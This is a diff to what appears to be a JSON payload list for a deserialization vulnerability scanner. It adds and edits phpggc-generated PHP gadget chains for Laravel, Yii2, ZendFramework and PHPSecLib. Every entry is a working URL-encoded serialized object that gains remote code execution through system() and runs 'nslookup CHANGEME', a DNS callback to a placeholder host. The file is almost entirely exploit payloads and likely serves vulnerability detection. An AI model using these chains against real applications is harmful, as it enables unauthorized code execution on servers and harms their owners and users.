@@ -68,13 +68,13 @@
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.8.30 (5)",
-    "gen_with": "./phpggc Laravel/RCE5 \"system('nslookup CHANGEME');\"",
+    "gen_with": "./phpggc Laravel/RCE5 <php-code>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup CHANGEME')%3B exit%3B ?>\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Laravel 5.5.* (6)",
-    "gen_with": "./phpggc Laravel/RCE6 \"system('nslookup CHANGEME');\"",
+    "gen_with": "./phpggc Laravel/RCE6 <php-code>",
     "payload": "O:29:\"Illuminate\\Support\\MessageBag\":2:{s:11:\"%00*%00messages\"%3Ba:0:{}s:9:\"%00*%00format\"%3BO:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Ba:2:{i:0%3BO:25:\"Mockery\\Loader\\EvalLoader\":0:{}i:1%3Bs:4:\"load\"%3B}}s:8:\"%00*%00event\"%3BO:38:\"Illuminate\\Broadcasting\\BroadcastEvent\":1:{s:10:\"connection\"%3BO:32:\"Mockery\\Generator\\MockDefinition\":2:{s:9:\"%00*%00config\"%3BO:35:\"Mockery\\Generator\\MockConfiguration\":1:{s:7:\"%00*%00name\"%3Bs:7:\"abcdefg\"%3B}s:7:\"%00*%00code\"%3Bs:98:\"<?php system('nslookup CHANGEME')%3B exit%3B ?>\"%3B}}}}"
   },
   {
@@ -82,6 +82,12 @@
     "name": "Laravel ? <= 8.16.1 (7)",
     "gen_with": "./phpggc Laravel/RCE7 <function> <parameter>",
     "payload": "O:40:\"Illuminate\\Broadcasting\\PendingBroadcast\":2:{s:9:\"%00*%00events\"%3BO:25:\"Illuminate\\Bus\\Dispatcher\":1:{s:16:\"%00*%00queueResolver\"%3Bs:6:\"system\"%3B}s:8:\"%00*%00event\"%3BO:34:\"Illuminate\\Queue\\CallQueuedClosure\":1:{s:13:\"%00*%00connection\"%3Bs:72:\"nslookup CHANGEME\"%3B}}"
+  },
+  {
+    "_needs_dynamic_payload_editing": false,
+    "name": "Laravel 7.0.0 <= 8.6.9+ (8)",
+    "gen_with": "./phpggc Laravel/RCE8 <function> <parameter>",
+    "payload": "O:31:\"GuzzleHttp\\Cookie\\FileCookieJar\":1:{s:41:\"%00GuzzleHttp\\Cookie\\FileCookieJar%00filename\"%3BO:38:\"Illuminate\\Validation\\Rules\\RequiredIf\":1:{s:9:\"condition\"%3Ba:2:{i:0%3BO:20:\"PhpOption\\LazyOption\":2:{s:30:\"%00PhpOption\\LazyOption%00callback\"%3Bs:6:\"system\"%3Bs:31:\"%00PhpOption\\LazyOption%00arguments\"%3Ba:1:{i:0%3Bs:72:\"nslookup CHANGEME\"%3B}}i:1%3Bs:3:\"get\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
@@ -278,13 +284,13 @@
   {
     "_needs_dynamic_payload_editing": false,
     "name": "Yii2 < 2.0.38 (CVE-2020-15148) (2)",
-    "gen_with": "./phpggc Yii2/RCE2 \"system('nslookup CHANGEME');\"",
+    "gen_with": "./phpggc Yii2/RCE2 <php-code>",
     "payload": "O:23:\"yii\\db\\BatchQueryResult\":1:{s:36:\"%00yii\\db\\BatchQueryResult%00_dataReader\"%3BO:17:\"yii\\web\\DbSession\":1:{s:13:\"writeCallback\"%3Ba:2:{i:0%3BO:32:\"yii\\caching\\ExpressionDependency\":1:{s:10:\"expression\"%3Bs:83:\"system('nslookup CHANGEME')%3B\"%3B}i:1%3Bs:18:\"evaluateDependency\"%3B}}}"
   },
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (1)",
-    "gen_with": "./phpggc ZendFramework/RCE1 \"system('nslookup CHANGEME');\"",
+    "gen_with": "./phpggc ZendFramework/RCE1 <php-code>",
     "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:23:\"Zend_Filter_PregReplace\":2:{s:16:\"%00*%00_matchPattern\"%3Bs:7:\"/(.*)/e\"%3Bs:15:\"%00*%00_replacement\"%3Bs:83:\"system('nslookup CHANGEME')%3B\"%3B}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:6:\"layout\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
   },
   {
@@ -302,7 +308,13 @@
   {
     "_needs_dynamic_payload_editing": false,
     "name": "ZendFramework ? <= 1.12.20 (4)",
-    "gen_with": "./phpggc ZendFramework/RCE4 \"system('nslookup CHANGEME');\"",
+    "gen_with": "./phpggc ZendFramework/RCE4 <php-code>",
     "payload": "O:8:\"Zend_Log\":1:{s:11:\"%00*%00_writers\"%3Ba:1:{i:0%3BO:20:\"Zend_Log_Writer_Mail\":5:{s:16:\"%00*%00_eventsToMail\"%3Ba:1:{i:0%3Bi:1%3B}s:22:\"%00*%00_layoutEventsToMail\"%3Ba:0:{}s:8:\"%00*%00_mail\"%3BO:9:\"Zend_Mail\":0:{}s:10:\"%00*%00_layout\"%3BO:11:\"Zend_Layout\":3:{s:13:\"%00*%00_inflector\"%3BO:21:\"Zend_Filter_Inflector\":1:{s:9:\"%00*%00_rules\"%3Ba:1:{s:6:\"script\"%3Ba:1:{i:0%3BO:20:\"Zend_Filter_Callback\":2:{s:12:\"%00*%00_callback\"%3Bs:15:\"create_function\"%3Bs:11:\"%00*%00_options\"%3Ba:1:{i:0%3Bs:0:\"\"%3B}}}}}s:20:\"%00*%00_inflectorEnabled\"%3Bb:1%3Bs:10:\"%00*%00_layout\"%3Bs:88:\"){}system('nslookup CHANGEME')%3B/*\"%3B}s:22:\"%00*%00_subjectPrependText\"%3BN%3B}}}"
+  },
+  {
+  "_needs_dynamic_payload_editing": false,
+  "name": "PHPSecLib 2.0.0 <= 2.0.34 (1)",
+  "gen_with": "./phpggc PHPSecLib/RCE1 <php-code>",
+  "payload": "a:1:{i:0%3BO:18:\"phpseclib\\Net\\SSH1\":2:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3BO:19:\"phpseclib\\Crypt\\AES\":8:{s:6:\"bitmap\"%3Bi:1%3Bs:6:\"crypto\"%3Bi:1%3Bs:10:\"block_size\"%3BN%3Bs:12:\"inline_crypt\"%3Ba:2:{i:0%3BO:25:\"phpseclib\\Crypt\\TripleDES\":6:{s:10:\"block_size\"%3Bs:111:\"1){}}}%3B ob_clean()%3Bsystem('nslookup CHANGEME')%3Bdie()%3B ?>\"%3Bs:12:\"inline_crypt\"%3BN%3Bs:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}i:1%3Bs:26:\"_createInlineCryptFunction\"%3B}s:16:\"use_inline_crypt\"%3Bi:1%3Bs:7:\"changed\"%3Bi:0%3Bs:6:\"engine\"%3Bi:1%3Bs:4:\"mode\"%3Bi:1%3B}}}"
   }
 ]
